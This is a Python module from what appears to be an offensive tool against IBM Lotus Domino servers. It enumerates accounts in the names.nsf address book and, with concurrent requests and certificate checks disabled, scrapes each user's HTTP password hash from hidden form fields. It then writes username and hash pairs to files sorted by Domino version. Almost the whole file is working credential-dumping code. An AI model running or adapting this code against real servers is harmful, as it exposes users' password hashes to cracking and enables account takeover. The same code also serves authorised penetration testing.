# Copyright (c) 2015, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import re
import requests
from bs4 import BeautifulSoup
from domi_owned import utility
from simple_requests import Requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Get user profile URLs
def enum_accounts(target, header, username, password):
	session = requests.Session()
	session.auth = (username, password)

	accounts = []
	account_urls = []

	for page in range(1, 100000, 1000):
		try:
			pages = "{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}&Count=1000".format(target, page)
			request = session.get(pages, headers=header, timeout=(60), verify=False)
			if request.status_code == 200:
				if 'form method="post"' in request.text:
					utility.print_warn('Unable to access names.nsf, bad username or password!')
					break
				else:
					soup = BeautifulSoup(request.text, 'lxml')
					empty_page = soup.findAll('h2')
					if empty_page:
						break
					else:
						links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
						for link in links:
							account_regex = re.search("/(([a-fA-F0-9]{32})/([a-fA-F0-9]{32}))", link)
							if account_regex and account_regex.group(1) not in accounts:
								accounts.append(account_regex.group(1))
							else:
								pass
			elif request.status_code == 401:
				utility.print_warn('Unable to access names.nsf, bad username or password!')
				break
			else:
				utility.print_warn('Could not connect to Domino server!')
				break
		except Exception as error:
			utility.print_error("Error: {0}".format(error))
			break

	if len(accounts) > 0:
		if len(accounts) == 1:
			utility.print_good("Found {0} account, dumping hash".format(len(accounts)))
		elif len(accounts) > 1:
			utility.print_good("Found {0} accounts, dumping hashes".format(len(accounts)))

		for unid in accounts:
			account_urls.append("{0}/names.nsf/{1}?OpenDocument".format(target, unid))

		async_requests(account_urls, header, username, password)

# Asynchronously get accounts
def async_requests(accounts, header, username, password):
	requests = Requests(concurrent=40)
	requests.session.headers = header
	requests.session.auth = (username, password)
	requests.session.verify = False

	try:
		for account_url in requests.swarm(accounts, maintainOrder=False):	
			if account_url.status_code == 200:
				get_domino_hash(account_url)
	except KeyboardInterrupt:
		requests.stop(killExecuting=True)

# Dump Domino hashes
def get_domino_hash(response):
	soup = BeautifulSoup(response.text, 'lxml')
	try:
		# Get account username
		username_params = ['$dspFullName', '$dspShortName']
		for user_param in username_params:
			domino_username = (soup.find('input', attrs={'name':user_param}))['value']
			if len(domino_username) > 0:
				break
			else:
				continue

		# Get account hash
		hash_params = ['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']
		for hash_param in hash_params:
			domino_hash = (soup.find('input', attrs={'name':hash_param}))['value']
			if len(domino_hash) > 0:
				break
			else:
				continue
	except:
		pass

	if domino_username and domino_hash:
		print "{0}, {1}".format(domino_username.encode('utf-8'), domino_hash)
		write_hash(domino_username.encode('utf-8'), domino_hash)

# Sort and write hashes to file
def write_hash(duser, dhash):
	# Domino 5 hash format: 3dd2e1e5ac03e230243d58b8c5ada076
	if len(dhash) == 34:
		dhash = dhash.strip('()')
		outfile = 'Domino_5_hashes.txt'
	# Domino 6 hash format: (GDpOtD35gGlyDksQRxEU)
	elif len(dhash) == 22:
		outfile = 'Domino_6_hashes.txt'
	# Domino 8 hash format: (HsjFebq0Kh9kH7aAZYc7kY30mC30mC3KmC30mCluagXrvWKj1)
	else:
		outfile = 'Domino_8_hashes.txt'

	with open(outfile, 'a') as output:
		hash_format = "{0}:{1}\n".format(duser, dhash)
		output.write(hash_format)
	output.close()
